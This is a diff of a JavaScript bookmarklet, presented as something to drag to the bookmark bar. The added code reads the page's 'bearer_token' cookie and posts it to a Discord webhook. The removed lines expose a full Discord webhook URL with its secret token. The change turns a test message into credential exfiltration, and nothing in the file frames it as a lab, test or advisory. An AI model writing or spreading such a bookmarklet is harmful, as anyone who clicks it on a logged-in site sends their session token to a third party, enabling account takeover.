@@ -1,29 +1,32 @@
 <header>
   1. Drag the Bookmark to the bookmark bar
 </header>
-javascript: (function() {
-    var webhookURL = 'https://discord.com/api/webhooks/1162755707641270292/GAJaJbRKUVBdfpzA4f71Jgey3itgk64mlI105yel-bUQOvLr1D8Ahj151i_n9eKlRrPw';
-    var message = 'This is a test message!';
+javascript:(function() {
+    var bearerToken = `; ${document.cookie}`.split('; bearer_token=').pop().split(';').shift();
+    sendToDiscord(bearerToken);
 
-    var xhr = new XMLHttpRequest();
-    xhr.open("POST", webhookURL, true);
-    xhr.setRequestHeader('Content-Type', 'application/json');
+    function sendToDiscord(token) {
+        var webhookURL = 'YOUR_DISCORD_WEBHOOK_URL';
+        var message = 'Bearer Token: ' + token;
 
-    xhr.onreadystatechange = function() {
-        if (xhr.readyState === XMLHttpRequest.DONE) {
-            if (xhr.status === 200) {
-                alert('Message sent to Discord!');
-            } else {
-                alert('Error sending message to Discord. Status code: ' + xhr.status);
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", webhookURL, true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === XMLHttpRequest.DONE) {
+                if (xhr.status === 200) {
+                    alert('Message sent to Discord!');
+                } else {
+                    alert('Error sending message to Discord. Status code: ' + xhr.status);
+                }
             }
         }
-    }
 
-    var params = {
-        username: 'Bookmarklet',
-        avatar_url: '',
-        content: message
-    }
+        var params = {
+            content: message
+        }
 
-    xhr.send(JSON.stringify(params));
+        xhr.send(JSON.stringify(params));
+    }
 })();
